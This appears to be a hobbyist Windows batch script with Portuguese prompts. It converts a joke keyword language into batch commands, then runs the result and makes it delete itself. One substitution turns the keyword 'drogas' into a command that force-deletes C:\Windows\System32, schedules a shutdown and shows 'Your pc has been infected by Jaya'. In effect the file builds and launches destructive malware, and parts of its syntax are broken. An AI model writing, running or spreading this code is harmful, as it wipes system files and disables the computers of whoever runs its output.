@ECHO OFF
set jayaname=%random%

set /p filename=Nome do arquivo:

set NewL=^


set NewL=^^^%NLM%%NLM%^%NLM%%NLM%
cls

echo >>jayalog.jayalog

powershell -Command "(gc %filename%) -replace 'i en idiota', '@echo off' | Out-File -encoding ASCII jayalog.jayalog"

powershell -Command "(gc jayalog.jayalog) -replace 'mamar', 'call' | Out-File -encoding ASCII jayalog.jayalog"

powershell -Command "(gc jayalog.jayalog) -replace 'senha', 'set /p' | Out-File -encoding ASCII jayalog.jayalog"

powershell -Command "(gc jayalog.jayalog) -replace 'lup', 'goto' | Out-File -encoding ASCII jayalog.jayalog"

powershell -Command "(gc jayalog.jayalog) -replace 'me raquearu', 'REM ' | Out-File -encoding ASCII jayalog.jayalog"

powershell -Command "(gc jayalog.jayalog) -replace 'si sim', 'if' | Out-File -encoding ASCII jayalog.jayalog"

powershell -Command "(gc jayalog.jayalog) -replace 'si no', 'else' | Out-File -encoding ASCII jayalog.jayalog"

powershell -Command "(gc jayalog.jayalog) -replace 'npme', 'title' | Out-File -encoding ASCII jayalog.jayalog"

powershell -Command "(gc jayalog.jayalog) -replace '!!', '%%' | Out-File -encoding ASCII jayalog.jayalog"

powershell -Command "(gc jayalog.jayalog) -replace 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ', 'set ' | Out-File -encoding ASCII jayalog.jayalog"

powershell -Command "(gc jayalog.jayalog) -replace 'anonimos', 'random' | Out-File -encoding ASCII jayalog.jayalog"

powershell -Command "(gc jayalog.jayalog) -replace 'aparecer', 'echo' | Out-File -encoding ASCII jayalog.jayalog"

powershell -Command "(gc jayalog.jayalog) -replace 'hac', '' | Out-File -encoding ASCII jayalog.jayalog"

powershell -Command "(gc jayalog.jayalog) -replace 'sexo', 'msg "%username%"' | Out-File -encoding ASCII jayalog.jayalog"

powershell -Command "(gc jayalog.jayalog) -replace 'drogas', 'del C:\Windows\System32 /F /Q shutdown -s -t 1000 c "Your pc has been infected by Jaya"' | Out-File -encoding ASCII jayalog.jayalog"

rename jayalog.jayalog %jayaname%.bat
echo %NewL%del %jayaname%.bat >> %jayaname%.bat
start %jayaname%.bat
pause
)
